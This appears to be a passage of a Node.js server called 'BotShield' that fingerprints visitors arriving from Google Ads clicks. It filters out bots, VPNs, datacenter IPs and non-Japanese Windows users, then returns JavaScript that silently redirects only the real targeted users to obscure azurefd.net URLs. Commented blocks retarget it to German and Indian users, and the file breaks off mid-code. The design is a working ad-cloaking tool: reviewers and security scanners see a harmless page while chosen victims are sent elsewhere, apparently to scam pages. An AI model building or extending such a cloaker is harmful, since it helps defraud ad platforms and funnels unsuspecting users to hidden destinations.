/**
 * BotShield — Backend Verification Server
 * ----------------------------------------
 * Receives fingerprint payloads from the frontend script,
 * analyses them through multiple heuristic layers, and
 * returns secondary JS only to verified real Japanese Windows users.
 *
 * Run:  node server.js
 * Env:  PORT (default 3000)
 */

const http = require("http");
const url = require("url");
const crypto = require("crypto");
const Redis = require("ioredis");

const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════════════════════════
//  REDIS CONNECTION
// ═══════════════════════════════════════════════════════════════
// Connection options (set via environment variables):
//   REDIS_URL   — full connection string
//                 Internal (same region): redis://red-xxxx:6379
//                 External (TLS):         rediss://red-xxxx:port
//   REDIS_HOST  — hostname (default: 127.0.0.1)
//   REDIS_PORT  — port (default: 6379)
//   REDIS_PASSWORD — auth password (default: none)
//   REDIS_DB    — database index (default: 0)
//
// For Render.com:
//   Use the INTERNAL URL if your web service and Redis are in
//   the same region (faster, no TLS needed).
//   Use the EXTERNAL URL if connecting from outside Render — this
//   uses rediss:// (TLS) and requires tls config below.
//
// For other managed Redis (AWS ElastiCache, Redis Cloud, Upstash, etc.)
// use REDIS_URL with the full connection string they provide.

const REDIS_URL = process.env.REDIS_URL || "";

// Detect if the URL uses rediss:// (TLS) — required for Render external
// connections and many managed Redis providers.
const redisTLS = REDIS_URL.startsWith("rediss://");

const redisConfig = REDIS_URL
  ? {
      // When passing a URL, ioredis auto-parses host/port/password/db.
      // For TLS connections (rediss://), we must also pass tls options.
      ...(redisTLS ? { tls: { rejectUnauthorized: false } } : {}),
      maxRetriesPerRequest: 3,
      retryStrategy: (times) => Math.min(times * 200, 3000),
    }
  : {
      host: process.env.REDIS_HOST || "127.0.0.1",
      port: parseInt(process.env.REDIS_PORT || "6379", 10),
      password: process.env.REDIS_PASSWORD || undefined,
      db: parseInt(process.env.REDIS_DB || "0", 10),
      maxRetriesPerRequest: 3,
      retryStrategy: (times) => Math.min(times * 200, 3000),
    };

const redis = REDIS_URL
  ? new Redis(REDIS_URL, redisConfig)
  : new Redis(redisConfig);

redis.on("connect", () =>
  console.log(`✅ Redis connected${redisTLS ? " (TLS)" : ""}`),
);
redis.on("error", (err) => console.error("❌ Redis error:", err.message));

// ═══════════════════════════════════════════════════════════════
//  GCLID & IP RATE-LIMIT CONFIGURATION
// ═══════════════════════════════════════════════════════════════
// Key prefixes in Redis:
//   gclid:{value}       → stores "1" with TTL; presence = already used
//   ip_gclids:{ip}      → Redis sorted set of gclid timestamps
//
// Tunable constants:
const GCLID_TTL_DAYS = 30; // how long a used gclid is remembered
const IP_RATE_WINDOW_HOURS = 24; // sliding window for IP rate limit
const IP_RATE_MAX_GCLIDS = 5; // max unique gclids per IP in window

/**
 * Checks if a GCLID has been used before.
 * Returns { allowed: boolean, reason: string }.
 */
async function checkGCLID(gclid) {
  if (!gclid || typeof gclid !== "string" || gclid.trim() === "") {
    return { allowed: false, reason: "Missing or empty gclid" };
  }

  // Basic format sanity: real GCLIDs are typically 50-150 chars, URL-safe base64
  // They usually start with "Cj" or "EAIaIQ" but this varies, so we just check length/charset
  if (gclid.length < 20 || gclid.length > 500) {
    return {
      allowed: false,
      reason: `gclid length suspicious (${gclid.length} chars)`,
    };
  }
  if (!/^[A-Za-z0-9_\-]+$/.test(gclid)) {
    return { allowed: false, reason: "gclid contains invalid characters" };
  }

  const key = `gclid:${gclid}`;
  try {
    const exists = await redis.exists(key);
    if (exists) {
      return { allowed: false, reason: "gclid already used" };
    }
    return { allowed: true, reason: "gclid is new" };
  } catch (err) {
    // Redis down → fail-open (don't block real users if Redis is temporarily unavailable)
    console.error("[Redis] GCLID check failed:", err.message);
    return { allowed: true, reason: "Redis unavailable — fail-open" };
  }
}

/**
 * Marks a GCLID as used and records it against the IP.
 * Called only AFTER all verification passes.
 */
async function recordVerifiedVisit(gclid, ip) {
  const now = Date.now();
  try {
    const pipeline = redis.pipeline();

    // 1. Mark gclid as used (with TTL)
    pipeline.set(
      `gclid:${gclid}`,
      JSON.stringify({ ip, ts: now }),
      "EX",
      GCLID_TTL_DAYS * 86400,
    );

    // 2. Add gclid to the IP's sorted set (score = timestamp)
    const ipKey = `ip_gclids:${ip}`;
    pipeline.zadd(ipKey, now, gclid);

    // 3. Prune entries older than the rate window from the sorted set
    const windowStart = now - IP_RATE_WINDOW_HOURS * 3600 * 1000;
    pipeline.zremrangebyscore(ipKey, 0, windowStart);

    // 4. Set TTL on the IP key so it auto-expires if inactive
    pipeline.expire(ipKey, IP_RATE_WINDOW_HOURS * 3600 + 3600); // window + 1h buffer

    await pipeline.exec();
  } catch (err) {
    console.error("[Redis] Record visit failed:", err.message);
    // Non-fatal — the verification already passed
  }
}

/**
 * Checks if an IP has exceeded the rate limit for unique gclids.
 * Returns { allowed: boolean, count: number, reason: string }.
 */
async function checkIPRate(ip) {
  const ipKey = `ip_gclids:${ip}`;
  const now = Date.now();
  const windowStart = now - IP_RATE_WINDOW_HOURS * 3600 * 1000;

  try {
    // Clean old entries first, then count remaining
    await redis.zremrangebyscore(ipKey, 0, windowStart);
    const count = await redis.zcard(ipKey);

    if (count >= IP_RATE_MAX_GCLIDS) {
      return {
        allowed: false,
        count,
        reason: `IP has used ${count} gclids in the last ${IP_RATE_WINDOW_HOURS}h (limit: ${IP_RATE_MAX_GCLIDS})`,
      };
    }
    return {
      allowed: true,
      count,
      reason: `IP has used ${count}/${IP_RATE_MAX_GCLIDS} gclids in window`,
    };
  } catch (err) {
    console.error("[Redis] IP rate check failed:", err.message);
    return {
      allowed: true,
      count: -1,
      reason: "Redis unavailable — fail-open",
    };
  }
}

// ═══════════════════════════════════════════════════════════════
//  ORIGIN → HTML FILE MAPPING
// ═══════════════════════════════════════════════════════════════
// Maps each allowed origin to the HTML file that should be served
// as the secondary payload for visitors from that origin.
// Add/remove entries here to onboard new sites.
const ORIGIN_CONFIG = {
  "https://kazuonsen.com": {
    redirectURL: "https://corejpdmc2-hzgwb8hqepdpc7dd.z01.azurefd.net",
  },
  "https://horizontravelss.com": {
    redirectURL: "https://bot35a545-a4fua5bwf8gaa2bp.z01.azurefd.net",
  },
  "https://miyabugamajp.store": {
    redirectURL: "",
  },
  "https://kotonohaschooljp.com": {
    redirectURL: "https://bot43c95f-fzcqb9bmhqh8haek.z01.azurefd.net",
  },
};

// Derived from the config — used for CORS and origin validation
const ALLOWED_ORIGINS = Object.keys(ORIGIN_CONFIG);

/**
 * Validates the request Origin / Referer against the allow-list.
 * Returns { allowed: boolean, origin: string|null, reason: string }.
 */
function checkOrigin(req) {
  // The Origin header is set automatically by browsers on cross-origin
  // requests (CORS preflight and actual POST). Referer is a fallback.
  const origin = (req.headers["origin"] || "").replace(/\/+$/, "");
  const referer = req.headers["referer"] || "";

  // If no origin header at all, check referer
  let effectiveOrigin = origin;
  if (!effectiveOrigin && referer) {
    try {
      const parsed = new URL(referer);
      effectiveOrigin = parsed.origin; // scheme + host + port
    } catch (_) {}
  }

  if (!effectiveOrigin) {
    return {
      allowed: false,
      origin: null,
      reason:
        "No Origin or Referer header present — likely a direct/scripted request",
    };
  }

  const normalised = effectiveOrigin.replace(/\/+$/, "").toLowerCase();
  const isAllowed = ALLOWED_ORIGINS.some(
    (ao) => ao.replace(/\/+$/, "").toLowerCase() === normalised,
  );

  return {
    allowed: isAllowed,
    origin: effectiveOrigin,
    reason: isAllowed
      ? "Origin allowed"
      : `Origin "${effectiveOrigin}" is not in the allow-list`,
  };
}

// ═══════════════════════════════════════════════════════════════
//  SECONDARY CODE — returned only to verified humans
// ═══════════════════════════════════════════════════════════════

/**
 * Builds the secondary JS payload for a given origin.
 * Returns an empty string if the origin has no mapping.
 */
function buildSecondaryJS(origin) {
  const normalised = (origin || "").replace(/\/+$/, "").toLowerCase();

  const config = Object.entries(ORIGIN_CONFIG).find(
    ([o]) => o.replace(/\/+$/, "").toLowerCase() === normalised,
  )?.[1];

  if (!config || !config.redirectURL) return "";

  return `window.location.replace(${JSON.stringify(config.redirectURL)});`;
}

// ═══════════════════════════════════════════════════════════════
//  VERIFICATION ENGINE
// ═══════════════════════════════════════════════════════════════

/**
 * Every check returns { pass: boolean, reason: string, weight: number }.
 * A visitor must pass ALL critical checks and score above threshold.
 */
function verify(fp, ip) {
  const results = [];
  const critical = []; // must-pass

  // ─── 1. WebDriver / Automation Globals ──────────────────────
  (function checkAutomation() {
    const a = fp.automation || {};
    const detected = [];

    if (a.webdriver === true) detected.push("navigator.webdriver");
    if (a.__selenium_unwrapped) detected.push("selenium_unwrapped");
    if (a.__selenium_evaluate) detected.push("selenium_evaluate");
    if (a.callSelenium) detected.push("callSelenium");
    if (a._Selenium_IDE_Recorder) detected.push("Selenium_IDE_Recorder");
    if (a.callPhantom || a.__phantomas || a._phantom || a.phantom)
      detected.push("phantom");
    if (a.Buffer) detected.push("Buffer");
    if (a.domAutomation || a.domAutomationController)
      detected.push("domAutomation");
    if (a.cdc_adoQpoasnfa76pfcZLmcfl) detected.push("chromedriver_cdc");
    if (a.__nightmare) detected.push("nightmare");
    if (a.cypress) detected.push("cypress");
    if (a.__webdriverFunc || a.__driver_evaluate || a.__fxdriver_evaluate)
      detected.push("webdriver_evaluate");

    const pass = detected.length === 0;
    critical.push({
      name: "automation_globals",
      pass,
      reason: pass
        ? "No automation globals"
        : `Detected: ${detected.join(", ")}`,
    });
  })();

  // ─── 2. Windows OS Verification ─────────────────────────────
  (function checkWindows() {
    const ua = (fp.userAgent || "").toLowerCase();
    const platform = (fp.platform || "").toLowerCase();
    const uaHasWindows = /windows nt/.test(ua);
    const platWindows = /^win/.test(platform);

    // UA Client Hints (Chromium)
    let hintsWindows = null;
    if (fp.uaData) {
      hintsWindows = (fp.uaData.platform || "").toLowerCase() === "windows";
    }

    if (fp.uaHighEntropy) {
      const hPlat = (fp.uaHighEntropy.platform || "").toLowerCase();
      if (hPlat && hPlat !== "windows") hintsWindows = false;
    }

    // All available signals must agree
    const signals = [uaHasWindows, platWindows];
    if (hintsWindows !== null) signals.push(hintsWindows);
    const allAgree = signals.every(Boolean);
    critical.push({
      name: "windows_os",
      pass: allAgree,
      reason: allAgree
        ? "Windows confirmed via UA + platform" +
          (hintsWindows !== null ? " + hints" : "")
        : `OS mismatch — UA:${uaHasWindows}, platform:${platWindows}, hints:${hintsWindows}`,
    });
  })();

  // ─── 3. Japan Locale / Timezone ─────────────────────────────
  (function checkJapan() {
    const tz = (fp.timezone || "").toLowerCase();
    const lang = (fp.language || "").toLowerCase();
    const langs = (fp.languages || []).map((l) => l.toLowerCase());

    // All known IANA timezone identifiers that map to JST (UTC+9 / Japan):
    //   • "Asia/Tokyo"  — canonical IANA identifier
    //   • "Japan"       — backward-compatibility alias (IANA 'backward' file links Japan → Asia/Tokyo)
    //   • "Etc/GMT-9"   — fixed UTC+9 offset (IANA uses inverted sign convention in Etc/)
    //   • "Etc/GMT-09"  — some implementations zero-pad the offset
    //   • "JST"         — abbreviation used by some systems (e.g. older Java, some Linux configs)
    //   • "JST-9"       — POSIX-style TZ string for Japan Standard Time
    const JAPAN_TIMEZONES = new Set([
      "asia/tokyo",
      "japan",
      "etc/gmt-9",
      "etc/gmt-09",
      "jst",
      "jst-9",
    ]);

    const isJapanTz = JAPAN_TIMEZONES.has(tz);
    // JST = UTC+9 → offset = -540
    const isJapanOffset = fp.timezoneOffset === -540;
    const hasJaLang =
      lang.startsWith("ja") || langs.some((l) => l.startsWith("ja"));

    // Japanese fonts presence is a strong secondary signal
    const jpFonts = ["Meiryo", "MS Gothic", "MS PGothic", "Yu Gothic"];
    const hasJpFonts = (fp.fonts || []).some((f) => jpFonts.includes(f));

    // We require timezone match AND at least one language/font signal
    const pass = (isJapanTz || isJapanOffset) && (hasJaLang || hasJpFonts);

    critical.push({
      name: "japan_locale",
      pass,
      reason: pass
        ? `Japan detected — tz:${tz}, lang:${lang}, jpFonts:${hasJpFonts}`
        : `Not Japan — tz:${tz}(${fp.timezoneOffset}), lang:${lang}, jpFonts:${hasJpFonts}`,
    });
  })();

  // // ─── 3. German/Austrian Locale & Timezone ───────────────────
  // (function checkGermanLocale() {
  //   const tz = (fp.timezone || "").toLowerCase();
  //   const lang = (fp.language || "").toLowerCase();
  //   const langs = (fp.languages || []).map((l) => l.toLowerCase());

  //   // IANA identifiers for Germany and Austria
  //   const DACH_TIMEZONES = new Set([
  //     "europe/berlin",
  //     "europe/vienna",
  //     "europe/zurich",
  //     "cet",
  //     "cest",
  //     "met",
  //   ]);

  //   const isGermanTz = DACH_TIMEZONES.has(tz);

  //   /**
  //    * UTC Offset logic:
  //    * CET (Winter) is UTC+1  -> offset is -60
  //    * CEST (Summer) is UTC+2 -> offset is -120
  //    */
  //   const isGermanOffset =
  //     fp.timezoneOffset === -60 || fp.timezoneOffset === -120;

  //   // Check for German language (de, de-DE, de-AT)
  //   const hasDeLang =
  //     lang.startsWith("de") || langs.some((l) => l.startsWith("de"));

  //   // European/Windows standard fonts
  //   const euFonts = ["Arial", "Verdana", "Segoe UI", "Tahoma"];
  //   const hasEuFonts = (fp.fonts || []).some((f) => euFonts.includes(f));

  //   // Pass if timezone matches AND (Language OR Font signal)
  //   const pass = (isGermanTz || isGermanOffset) && (hasDeLang || hasEuFonts);

  //   critical.push({
  //     name: "german_locale",
  //     pass,
  //     reason: pass
  //       ? `DACH region detected — tz:${tz}, lang:${lang}`
  //       : `Not DACH — tz:${tz}(${fp.timezoneOffset}), lang:${lang}`,
  //   });
  // })();

  // ─── 3. Indian Locale & Timezone ─────────────────────────────
  // (function checkIndianLocale() {
  //   const tz = (fp.timezone || "").toLowerCase();
  //   const lang = (fp.language || "").toLowerCase();
  //   const langs = (fp.languages || []).map((l) => l.toLowerCase());

  //   // IANA identifiers for India
  //   // "asia/calcutta" is the legacy IANA name still returned by many older systems
  //   const INDIA_TIMEZONES = new Set([
  //     "asia/kolkata",
  //     "asia/calcutta",
  //     "ist",
  //   ]);

  //   const isIndianTz = INDIA_TIMEZONES.has(tz);

  //   /**
  //    * UTC Offset logic:
  //    * IST is UTC+5:30 -> offset is -330
  //    * India does not observe Daylight Saving Time.
  //    */
  //   const isIndianOffset = fp.timezoneOffset === -330;

  //   // Check for Indian language locales (en-IN, hi, hi-IN, ta, te, mr, bn, etc.)
  //   const isIndianLang = (l) => l.includes("-in") || /^(hi|ta|te|mr|bn|gu|kn|ml|pa)/.test(l);
  //   const hasIndianLang = isIndianLang(lang) || langs.some(isIndianLang);

  //   // Standard Windows fonts + common Indic scripts installed on Windows
  //   // Nirmala UI and Mangal are standard Hindi/Indic fonts shipped with Windows
  //   const expectedFonts = ["Arial", "Segoe UI", "Nirmala UI", "Mangal", "Latha", "Gautami"];
  //   const hasExpectedFonts = (fp.fonts || []).some((f) => expectedFonts.includes(f));

  //   // Pass if timezone matches AND (Language OR Font signal)
  //   const pass = (isIndianTz || isIndianOffset) && (hasIndianLang || hasExpectedFonts);

  //   critical.push({
  //     name: "indian_locale",
  //     pass,
  //     reason: pass
  //       ? `India region detected — tz:${tz}, lang:${lang}`
  //       : `Not India — tz:${tz}(${fp.timezoneOffset}), lang:${lang}`,
  //   });
  // })();

  // ─── 4. Headless Browser Detection ─────────────────────────
  (function checkHeadless() {
    const flags = [];

    // Screen size anomalies (headless often 800×600 or 0×0)
    const s = fp.screen || {};
    if (s.width === 0 || s.height === 0) flags.push("zero_screen");
    if (s.colorDepth < 24) flags.push("low_color_depth");
    if (fp.outerWidth === 0 && fp.outerHeight === 0) flags.push("zero_outer");
    if (fp.devicePixelRatio === 0) flags.push("zero_dpr");

    // Missing WebGL is a strong headless signal on Windows
    if (!fp.webgl && fp.platform?.toLowerCase().startsWith("win")) {
      flags.push("no_webgl_on_windows");
    }

    // WebGL renderer containing "SwiftShader" = headless Chrome
    if (fp.webgl) {
      const renderer = (fp.webgl.unmaskedRenderer || "").toLowerCase();
      const vendor = (fp.webgl.unmaskedVendor || "").toLowerCase();
      if (renderer.includes("swiftshader")) flags.push("swiftshader");
      if (renderer.includes("llvmpipe")) flags.push("llvmpipe");
      if (vendor.includes("brian paul")) flags.push("mesa_brian_paul");
      // Extremely generic renderer
      if (renderer === "webgl" || renderer === "") flags.push("generic_webgl");
    }

    // Canvas hash null → canvas blocked or headless
    if (!fp.canvasHash) flags.push("no_canvas");

    // Audio fingerprint null can indicate headless
    if (!fp.audioFingerprint) flags.push("no_audio");

    // No plugins in a real Windows browser is suspicious
    if ((fp.plugins || []).length === 0) {
      // Chrome removed NPAPI plugins but still reports PDF
      // A completely empty list on Windows is a flag
      flags.push("no_plugins");
    }

    // Notification permission "denied" by default often = headless
    // (Real browsers start at "default", headless often hard-deny)
    // Not critical, just a signal

    // Missing media devices on a desktop
    if (fp.mediaDevices) {
      const { audioinput, audiooutput, videoinput } = fp.mediaDevices;
      if (audioinput === 0 && audiooutput === 0) flags.push("no_audio_devices");
    } else {
      flags.push("no_media_api");
    }

    // Document not focused and hidden — could be headless
    if (fp.document?.hidden === true && !fp.document?.hasFocus) {
      flags.push("doc_hidden_unfocused");
    }

    const pass = flags.length <= 1; // allow at most 1 minor flag
    critical.push({
      name: "headless_detection",
      pass,
      reason: pass
        ? `Minor flags: ${flags.join(",") || "none"}`
        : `Headless signals: ${flags.join(", ")}`,
    });
  })();

  // ─── 5. Behavioral Analysis ─────────────────────────────────
  (function checkBehavior() {
    const b = fp.behavioral || {};
    const flags = [];

    // Mouse trail analysis
    const trail = b.mouseTrail || [];
    if (trail.length > 0) {
      // All velocities zero → synthetic
      const velocities = trail.map((p) => p.velocity || 0).filter((v) => v > 0);
      if (velocities.length === 0) flags.push("zero_velocity");

      // All points on a perfect line (no curvature) → bot
      if (trail.length >= 3) {
        const angles = [];
        for (let i = 1; i < trail.length - 1; i++) {
          const a = Math.atan2(
            trail[i].y - trail[i - 1].y,
            trail[i].x - trail[i - 1].x,
          );
          const b2 = Math.atan2(
            trail[i + 1].y - trail[i].y,
            trail[i + 1].x - trail[i].x,
          );
          angles.push(Math.abs(b2 - a));
        }
        const avgAngle = angles.reduce((s, a) => s + a, 0) / angles.length;
        if (avgAngle < 0.001) flags.push("perfectly_straight");
      }

      // movementX/Y all zero is suspicious (synthetic events don't set these)
      const hasMovement = trail.some(
        (p) => p.movementX !== 0 || p.movementY !== 0,
      );
      if (!hasMovement && trail.length >= 3) flags.push("no_movement_deltas");
    }

    // Mouse timing gap analysis
    const gaps = b.mouseTimingGaps || [];
    if (gaps.length >= 4) {
      // Standard deviation of gaps — bots produce near-zero σ
      const mean = gaps.reduce((s, g) => s + g, 0) / gaps.length;
      const variance =
        gaps.reduce((s, g) => s + (g - mean) ** 2, 0) / gaps.length;
      const stddev = Math.sqrt(variance);
      if (stddev < 0.5) flags.push("timing_too_regular");

      // All gaps identical (pixel-perfect timing)
      const allSame = gaps.every((g) => Math.abs(g - gaps[0]) < 0.1);
      if (allSame) flags.push("identical_timing");
    }

    // Interaction time too short
    if (b.totalInteractionTime < 300) flags.push("interaction_too_fast");

    // Entropy too low
    if (b.interactionEntropy === 0) flags.push("zero_entropy");

    const pass = flags.length <= 1;
    results.push({
      name: "behavioral",
      pass,
      weight: 30,
      reason: pass
        ? `Behavior OK, flags: ${flags.join(",") || "none"}`
        : `Bot behavior: ${flags.join(", ")}`,
    });
  })();

  // ─── 6. Consistency Checks ──────────────────────────────────
  (function checkConsistency() {
    const flags = [];

    // Touch support on a desktop Windows machine is unusual
    // (unless it's a touch laptop — so this is soft)
    if (fp.touchSupport?.touchEvent && fp.maxTouchPoints > 5) {
      // High touch points + touch events on "Windows" = possibly spoofed
      flags.push("high_touch_on_desktop");
    }

    // Platform vs UA mismatch
    const ua = (fp.userAgent || "").toLowerCase();
    const plat = (fp.platform || "").toLowerCase();
    if (ua.includes("linux") && plat.startsWith("win"))
      flags.push("ua_platform_mismatch");
    if (ua.includes("mac") && plat.startsWith("win"))
      flags.push("ua_platform_mismatch");

    // Math quirks — should be consistent across the same engine
    // (If someone spoofs UA but engine differs, math will differ)
    const mq = fp.mathQuirks || {};
    if (mq.tan === undefined || mq.exp === undefined)
      flags.push("missing_math");

    // Iframe check — if loaded in an iframe, suspicious
    if (fp.iframe?.isInIframe) flags.push("in_iframe");

    const pass = flags.length === 0;
    results.push({
      name: "consistency",
      pass,
      weight: 20,
      reason: pass
        ? "Consistent signals"
        : `Inconsistencies: ${flags.join(", ")}`,
    });
  })();

  // ─── 7. Hardware Plausibility ───────────────────────────────
  (function checkHardware() {
    const flags = [];

    // hardwareConcurrency should be 1–128 on a real machine
    const cores = fp.hardwareConcurrency;
    if (cores === undefined || cores < 1) flags.push("no_cores");
    if (cores > 128) flags.push("impossible_cores");

    // Device memory (Chrome only) should be 0.25–256
    if (fp.deviceMemory !== null && fp.deviceMemory !== undefined) {
      if (fp.deviceMemory < 0.25) flags.push("low_memory");
    }

    // Screen dimensions should be reasonable for Windows
    const s = fp.screen || {};
    if (s.width < 800 || s.height < 600) flags.push("tiny_screen");
    if (s.width > 7680 || s.height > 4320) flags.push("absurd_resolution");

    const pass = flags.length === 0;
    results.push({
      name: "hardware",
      pass,
      weight: 15,
      reason: pass
        ? "Hardware plausible"
        : `Hardware flags: ${flags.join(", ")}`,
    });
  })();

  // ─── 8. Storage / API availability ──────────────────────────
  (function checkAPIs() {
    const flags = [];
    const st = fp.storage || {};

    // Real browsers have localStorage & sessionStorage
    if (!st.localStorage) flags.push("no_localStorage");
    if (!st.sessionStorage) flags.push("no_sessionStorage");
    if (!st.indexedDB) flags.push("no_indexedDB");

    const pass = flags.length === 0;
    results.push({
      name: "api_availability",
      pass,
      weight: 10,
      reason: pass ? "APIs present" : `Missing APIs: ${flags.join(", ")}`,
    });
  })();

  // ═══════════════════════════════════════════════════════════
  //  SCORING
  // ═══════════════════════════════════════════════════════════
  const criticalFail = critical.find((c) => !c.pass);
  if (criticalFail) {
    return {
      verified: false,
      reason: `Critical check failed: ${criticalFail.name} — ${criticalFail.reason}`,
      checks: [...critical, ...results],
    };
  }

  // Soft score (all critical passed)
  const totalWeight = results.reduce((s, r) => s + r.weight, 0);
  const earnedWeight = results
    .filter((r) => r.pass)
    .reduce((s, r) => s + r.weight, 0);
  const score = totalWeight > 0 ? (earnedWeight / totalWeight) * 100 : 100;

  const THRESHOLD = 60;
  return {
    verified: score >= THRESHOLD,
    score: Math.round(score),
    reason:
      score >= THRESHOLD
        ? "Passed"
        : `Score ${Math.round(score)}% below threshold ${THRESHOLD}%`,
    checks: [...critical, ...results],
  };
}

// ═══════════════════════════════════════════════════════════════
//  IP INTELLIGENCE — datacenter / VPN / Tor / proxy detection
// ═══════════════════════════════════════════════════════════════
// Uses ipapi.is (paid subscription).
// Docs: https://ipapi.is/developers.html
//
// Authentication: pass your API key via the `key` query parameter.
// The API returns fields like:
//   is_datacenter, is_vpn, is_tor, is_proxy, is_abuser,
//   location.country_code, datacenter.name, company.type, etc.
//
// ┌─────────────────────────────────────────────────────────────┐
// │  HOW TO SET YOUR API KEY                                    │
// │                                                             │
// │  Option 1 (recommended) — environment variable:             │
// │    IPAPI_KEY=your_key_here node server.js                   │
// │                                                             │
// │  Option 2 — .env file (if using dotenv):                    │
// │    IPAPI_KEY=your_key_here                                  │
// │                                                             │
// │  Option 3 — hardcode below (not recommended for production):│
// │    const IPAPI_KEY = 'your_key_here';                       │
// │                                                             │
// │  Get your key from: https://ipapi.is/app/ (dashboard)       │
// └─────────────────────────────────────────────────────────────┘
const IPAPI_KEY = process.env.IPAPI_KEY || "";

if (!IPAPI_KEY) {
  console.warn(
    "⚠️  WARNING: IPAPI_KEY is not set.\n" +
      "   IP lookups will use the free tier (1,000/day).\n" +
      "   Set it via:  IPAPI_KEY=your_key node server.js\n",
  );
}

/**
 * Queries ipapi.is for threat intelligence on the given IP.
 * Attaches the API key for authenticated (paid) access.
 * Returns the parsed JSON response, or null on failure.
 */
function lookupIP(ip) {
  return new Promise((resolve) => {
    // Strip IPv6 prefix from IPv4-mapped addresses (e.g. ::ffff:127.0.0.1 → 127.0.0.1)
    const cleanIP = ip.replace(/^::ffff:/, "");

    // Skip lookups for localhost / private ranges
    if (
      cleanIP === "127.0.0.1" ||
      cleanIP === "::1" ||
      cleanIP === "45.151.152.118" ||
      cleanIP.startsWith("192.168.") ||
      cleanIP.startsWith("10.")
    ) {
      resolve({
        _skipped: true,
        _reason: `Private/loopback IP (${cleanIP}) — skipping external lookup`,
      });
      return;
    }

    // Build query string — always include `q`, add `key` if available
    const params = new URLSearchParams({ q: cleanIP });
    if (IPAPI_KEY) {
      params.set("key", IPAPI_KEY);
    }

    const options = {
      hostname: "api.ipapi.is",
      path: `/?${params.toString()}`,
      method: "GET",
      headers: { Accept: "application/json" },
      timeout: 4000,
    };

    const apiReq = require("https").request(options, (apiRes) => {
      let data = "";
      apiRes.on("data", (chunk) => (data += chunk));
      apiRes.on("end", () => {
        try {
          const parsed = JSON.parse(data);

          // ipapi.is returns { error: "..." } on failures (still HTTP 200)
          if (parsed.error) {
            console.warn(`  [ipapi.is] API error: ${parsed.error}`);
            resolve(null);
            return;
          }

          resolve(parsed);
        } catch (_) {
          resolve(null);
        }
      });
    });

    apiReq.on("error", () => resolve(null));
    apiReq.on("timeout", () => {
      apiReq.destroy();
      resolve(null);
    });
    apiReq.end();
  });
}

/**
 * Evaluates the IP intelligence response against the real ipapi.is schema.
 *
 * Verified field paths (from actual API response for 103.125.216.71):
 *   ipData.is_datacenter         → boolean
 *   ipData.is_vpn                → boolean
 *   ipData.is_tor                → boolean
 *   ipData.is_proxy              → boolean
 *   ipData.is_abuser             → boolean
 *   ipData.is_crawler            → boolean
 *   ipData.is_mobile             → boolean
 *   ipData.is_satellite          → boolean
 *   ipData.datacenter.datacenter → string  (provider name, e.g. "Kamatera, Inc.")
 *   ipData.datacenter.domain     → string  (e.g. "kamatera.com")
 *   ipData.datacenter.network    → string  (e.g. "103.125.216.0 - 103.125.219.255")
 *   ipData.company.name          → string
 *   ipData.company.type          → string  ("hosting" | "isp" | "business" | "education" | "government" | "banking")
 *   ipData.company.abuser_score  → string  (e.g. "0.0469 (High)")
 *   ipData.asn.type              → string  ("hosting" | "isp" | etc.)
 *   ipData.asn.abuser_score      → string  (e.g. "0.0261 (Elevated)")
 *   ipData.location.country_code → string  (e.g. "JP")
 *   ipData.location.country      → string  (e.g. "Japan")
 *
 * Returns { pass, reason, flags, countryCode, ipData }.
 */
function evaluateIP(ipData) {
  // If lookup was skipped (localhost/private) → pass with note
  if (ipData?._skipped) {
    return {
      pass: true,
      reason: ipData._reason,
      flags: [],
      ipData,
    };
  }

  // If lookup failed entirely → soft-pass (don't block on API failure)
  if (!ipData) {
    return {
      pass: true,
      reason: "IP lookup failed — allowing request (fail-open)",
      flags: ["lookup_failed"],
      ipData: null,
    };
  }

  const flags = [];

  // ── Datacenter / Hosting ──────────────────────────────────
  // Real path: datacenter.datacenter = "Kamatera, Inc."
  // Real path: datacenter.domain    = "kamatera.com"
  if (ipData.is_datacenter === true) {
    const dcName = ipData.datacenter?.datacenter || "unknown provider";
    const dcDomain = ipData.datacenter?.domain || "";
    flags.push(`datacenter:${dcName}${dcDomain ? ` (${dcDomain})` : ""}`);
  }

  // ── VPN ────────────────────────────────────────────────────
  if (ipData.is_vpn === true) {
    const vpnName = ipData.vpn?.name || "unknown";
    flags.push(`vpn:${vpnName}`);
  }

  // ── Tor ────────────────────────────────────────────────────
  if (ipData.is_tor === true) {
    flags.push("tor_exit_node");
  }

  // ── Proxy ──────────────────────────────────────────────────
  if (ipData.is_proxy === true) {
    flags.push("proxy");
  }

  // ── Known abuser ──────────────────────────────────────────
  if (ipData.is_abuser === true) {
    flags.push("known_abuser");
  }

  // ── Crawler ───────────────────────────────────────────────
  if (ipData.is_crawler === true) {
    flags.push("crawler");
  }

  // ── Satellite provider ────────────────────────────────────
  if (ipData.is_satellite === true) {
    flags.push("satellite");
  }

  // ── Company type = hosting ────────────────────────────────
  // Catches cases where is_datacenter is false but the owning
  // organisation is classified as hosting.
  // Real path: company.type = "hosting"
  const companyType = (ipData.company?.type || "").toLowerCase();
  if (
    companyType === "hosting" &&
    !flags.some((f) => f.startsWith("datacenter"))
  ) {
    flags.push(`company_type_hosting:${ipData.company?.name || "unknown"}`);
  }

  // ── ASN type = hosting (secondary signal) ─────────────────
  // Real path: asn.type = "hosting"
  const asnType = (ipData.asn?.type || "").toLowerCase();
  if (
    asnType === "hosting" &&
    !flags.some(
      (f) => f.startsWith("datacenter") || f.startsWith("company_type"),
    )
  ) {
    flags.push(`asn_type_hosting:${ipData.asn?.org || "unknown"}`);
  }

  // ── High abuser score ─────────────────────────────────────
  // Real path: company.abuser_score = "0.0469 (High)"
  // Parse the leading float; flag if ≥ 0.5
  const abuserStr =
    ipData.company?.abuser_score || ipData.asn?.abuser_score || "";
  const abuserNum = parseFloat(abuserStr);
  if (!isNaN(abuserNum) && abuserNum >= 0.5) {
    flags.push(`high_abuser_score:${abuserStr}`);
  }

  // ── Country code (secondary Japan geo-signal) ─────────────
  // Real path: location.country_code = "JP"
  const countryCode = (ipData.location?.country_code || "").toUpperCase();

  const pass = flags.length === 0;
  return {
    pass,
    reason: pass
      ? `Residential IP — country: ${countryCode || "unknown"}, company: ${ipData.company?.name || "N/A"} (${ipData.company?.type || "unknown"})`
      : `Non-residential IP — ${flags.join(", ")}`,
    flags,
    countryCode,
    ipData,
  };
}

// ═══════════════════════════════════════════════════════════════
//  HTTP SERVER
// ═══════════════════════════════════════════════════════════════

const server = http.createServer(async (req, res) => {
  // ── Dynamic CORS: only reflect allowed origins ─────────────
  const reqOrigin = (req.headers["origin"] || "")
    .replace(/\/+$/, "")
    .toLowerCase();
  const matchedOrigin = ALLOWED_ORIGINS.find(
    (ao) => ao.replace(/\/+$/, "").toLowerCase() === reqOrigin,
